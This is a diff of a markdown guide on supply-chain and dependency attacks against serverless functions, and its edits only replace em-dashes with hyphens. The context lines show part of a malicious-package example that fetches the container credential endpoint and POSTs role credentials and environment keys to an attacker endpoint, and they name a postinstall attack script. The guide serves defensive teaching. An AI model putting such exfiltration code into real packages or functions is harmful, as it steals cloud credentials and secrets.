@@ -8,9 +8,9 @@
 
 ## Understanding Dependency Attack Vectors
 
-> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.
+> **⚠️ EDUCATIONAL PURPOSE ONLY** - the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.
 
-Dependency attacks come in two shapes. In the **known-vulnerable** shape, the attacker does nothing to your supply chain—they simply notice that a library you already ship has a public advisory, and they send input that triggers it. In the **malicious-package** shape, the attacker gets their own code into your tree (typosquat, hijack, confusion) so that it runs the moment your function imports it. Both end in the same place: attacker-influenced code executing inside your function, with your function's identity.
+Dependency attacks come in two shapes. In the **known-vulnerable** shape, the attacker does nothing to your supply chain-they simply notice that a library you already ship has a public advisory, and they send input that triggers it. In the **malicious-package** shape, the attacker gets their own code into your tree (typosquat, hijack, confusion) so that it runs the moment your function imports it. Both end in the same place: attacker-influenced code executing inside your function, with your function's identity.
 
 The serverless amplifier is **ambient credentials**. Any code in the process can read the environment and the container credential endpoint, so the distance from "arbitrary code runs" to "the account's keys are exfiltrated" is a single line.
 
@@ -87,7 +87,7 @@ An attacker publishes a package with your *internal* package's name, at a higher
 
 ### 4. Maintainer / Account Hijack of a Popular Package
 
-The attacker takes over a legitimate package (phished credentials, an abandoned but still-depended-on library, a "helpful" new co-maintainer) and pushes a malicious release—often hidden in a fresh transitive dependency.
+The attacker takes over a legitimate package (phished credentials, an abandoned but still-depended-on library, a "helpful" new co-maintainer) and pushes a malicious release-often hidden in a fresh transitive dependency.
 
 ```
 # You depend on "widely-used-lib" and never changed your range:
@@ -102,7 +102,7 @@ The attacker takes over a legitimate package (phished credentials, an abandoned 
 
 ### 5. Malicious Install-Time Script (postinstall)
 
-Package managers run lifecycle scripts during installation. Attacker code executes on the build/deploy host—before anything is deployed.
+Package managers run lifecycle scripts during installation. Attacker code executes on the build/deploy host-before anything is deployed.
 
 ```
 // attacker package.json
@@ -138,7 +138,7 @@ fetch(process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
       method: 'POST', body: JSON.stringify({ creds, keys: k }) }));
 ```
 
-**Payoff**: the function's temporary role credentials and all its environment secrets land at the attacker's endpoint—no CVE needed, just presence in the tree.
+**Payoff**: the function's temporary role credentials and all its environment secrets land at the attacker's endpoint-no CVE needed, just presence in the tree.
 
 ### 7. Vulnerable Library Bundled in a Shared Lambda Layer
 
@@ -210,11 +210,11 @@ The defensive lesson is that **SAS-6 and SAS-4 are multiplicative**: minimizing 
 
 ## Key Takeaways
 
-1. **Two ways in, one destination**—known CVEs and malicious packages both end in attacker code running with your function's identity.
-2. **Transitive and install-time are the blind spots**—the code you never named, running before you even deploy, is where these attacks live.
-3. **Credentials are ambient**—any imported module can read env vars and the container credential endpoint; RCE and exfiltration are one step apart.
-4. **Layers and stale runtimes multiply exposure**—one vulnerable shared artifact exploits an entire fleet.
-5. **Blast radius is set by the role**—chaining with SAS-4 turns a single bad dependency into full account compromise.
+1. **Two ways in, one destination**-known CVEs and malicious packages both end in attacker code running with your function's identity.
+2. **Transitive and install-time are the blind spots**-the code you never named, running before you even deploy, is where these attacks live.
+3. **Credentials are ambient**-any imported module can read env vars and the container credential endpoint; RCE and exfiltration are one step apart.
+4. **Layers and stale runtimes multiply exposure**-one vulnerable shared artifact exploits an entire fleet.
+5. **Blast radius is set by the role**-chaining with SAS-4 turns a single bad dependency into full account compromise.
 
 ## Next Steps
 
